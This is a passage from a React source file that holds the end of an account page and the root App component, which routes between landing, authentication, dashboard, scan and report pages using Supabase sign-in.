            </div>
          </div>
        </div>
        <button onClick={onSignOut} className="w-full py-3 bg-gray-800 hover:bg-gray-700 text-gray-300 font-semibold rounded-xl transition-colors">
          Sign Out
        </button>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ROOT APP
// ══════════════════════════════════════════════════════════════
export default function App() {
  const [page, setPage]         = useState('landing');
  const [user, setUser]         = useState(null);
  const [scanResult, setScanResult] = useState(null);
  const [toast, setToast]       = useState(null);
  const [authLoading, setAuthLoading] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) { setUser(data.session.user); setPage('dashboard'); }
      setAuthLoading(false);
    });
    const { data: listener } = supabase.auth.onAuthStateChange((_e, session) => {
      setUser(session?.user || null);
    });
    return () => listener.subscription.unsubscribe();
  }, []);

  async function handleSignOut() {
    await supabase.auth.signOut();
    setUser(null);
    setPage('landing');
  }

  if (authLoading) {
    return <div className="min-h-screen bg-gray-950 flex items-center justify-center"><div className="text-gray-500 font-mono animate-pulse">Loading…</div></div>;
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {toast && <Toast message={toast.message} type={toast.type} onClose={() => setToast(null)} />}

      {page === 'landing' && <LandingPage onLogin={() => setPage('login')} onSignup={() => setPage('signup')} />}

      {(page==='login'||page==='signup') && (
        <AuthPage mode={page}
          onSuccess={(u) => { setUser(u); setPage('dashboard'); }}
          onSwitch={() => setPage(page==='login'?'signup':'login')} />
      )}

      {page==='dashboard' && user && (
        <Dashboard user={user} onNewScan={() => setPage('scan')}
          onViewScan={async (id) => {
            try { const data = await apiFetch(`/api/scans/${id}`); setScanResult(data.scan.result); setPage('report'); }
            catch (err) { setToast({ message: err.message, type:'error' }); }
          }}
          onAccount={() => setPage('account')} />
      )}

      {page==='scan' && user && (
        <NewScanPage onComplete={(r) => { setScanResult(r); setPage('report'); }} onBack={() => setPage('dashboard')} />
      )}

      {page==='report' && scanResult && (
        <ScanReport result={scanResult} onBack={() => setPage('dashboard')} onNewScan={() => setPage('scan')} />
      )}

      {page==='account' && user && (
        <AccountPage user={user} onBack={() => setPage('dashboard')} onSignOut={handleSignOut} />
      )}
    </div>
  );
}
